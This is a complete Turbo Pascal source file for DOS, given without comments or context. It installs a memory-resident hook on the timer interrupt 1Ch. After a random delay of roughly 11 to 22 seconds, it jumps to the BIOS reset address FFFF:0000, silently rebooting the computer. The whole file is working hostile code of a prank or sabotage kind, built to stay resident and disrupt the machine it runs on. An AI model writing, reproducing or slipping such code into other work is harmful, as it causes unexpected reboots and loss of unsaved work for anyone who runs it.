{$M 1024,0,0}
{$R-,S-,D+,F+,V-,B-,N-,L+}

Uses CRT, DOS;

Var
  P : Pointer;
  i, TickTime, TimeCount : LongInt;

Procedure Call(s : Pointer);
  Begin
    Inline($9C/
           $FF/$5E/$06);
  End;

Procedure NewInt(Flag, CS, IP, AX, BX, DX, SI, DI, DS, ES, BP : Word); Interrupt;
  Var
    S : String;
    i : Byte;
  Begin
    Call(P);
    If TickTime = TimeCount Then
      Begin
        TickTime := TimeCount;
        InLine($EA/$00/$00/$FF/$FF);
      End
     Else Inc(TickTime);
  End;

Begin
  Randomize;
  TimeCount := Random(200)+200;
  TickTime := 0;
  GetIntVec($1C, P);
  SetIntVec($1C, @NewInt);
  Keep(0);{}
End.